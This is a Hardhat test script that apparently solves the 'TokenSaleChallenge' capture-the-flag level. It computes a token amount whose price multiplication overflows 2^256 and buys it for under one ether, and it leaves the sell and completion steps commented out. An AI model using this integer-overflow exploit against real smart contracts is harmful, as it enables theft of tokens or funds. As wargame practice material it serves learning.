import crypto from "crypto";
import { ethers } from "hardhat";
import { BigNumber, Contract, Signer } from "ethers";
import { expect } from "chai";

let accounts: Signer[];
let eoa: Signer;
let challengeContract: Contract;

before(async () => {
  accounts = await ethers.getSigners();
  eoa = accounts[0];
  const challengeFactory = await ethers.getContractFactory(
    "TokenSaleChallenge"
  );
  challengeContract = challengeFactory.attach(
    `0x56E9615787Fde82f3C68b572f68e2bC6C1866918`
  );
});

it("solves the challenge", async () => {

  // decimals not accepted in bn.js library... so we should find a workaround
  
  // we need to find 2^256 / 10^18 * 10^18 % 2^256 = a value close to 0
  // actually we can find a value = 0
  // since dividend = quotient * divisor + remainder
  // => we can calculate the right side of the formula and pass in as a argument to buy tokens

  
  const _2_POW_256 = BigNumber.from(`2`).pow(`256`)
  const ONE_ETHER = BigNumber.from(`10`).pow(`18`)
  const quotient = _2_POW_256.div(ONE_ETHER)
  const remainder = _2_POW_256.mod(ONE_ETHER)

  const overflowAmount = quotient.add(1).mul(ONE_ETHER).mod(_2_POW_256)

  expect(overflowAmount).be.lt(ONE_ETHER)
  
  console.log("quotient part : " + quotient)
  console.log("remainder part : " + remainder)
  console.log("1 ether - reminder : " + ONE_ETHER.sub(remainder))
  console.log("overflowed         : " + overflowAmount)

  const tokensToBuy = quotient.add(1)
  

  const buyTx = await challengeContract.buy(tokensToBuy, {
    value: ONE_ETHER.sub(remainder),
  });

  console.log(`hash`, buyTx.hash)
  await buyTx.wait();
  
  // const balance: BigNumber = await challengeContract.balanceOf(await eoa.getAddress());
  // console.log(`balance`, balance.toString());

  // const sellTx = await challengeContract.sell(`1`);
  // await sellTx.wait();

  // const isComplete = await challengeContract.isComplete();
  // expect(isComplete).to.be.true;

});
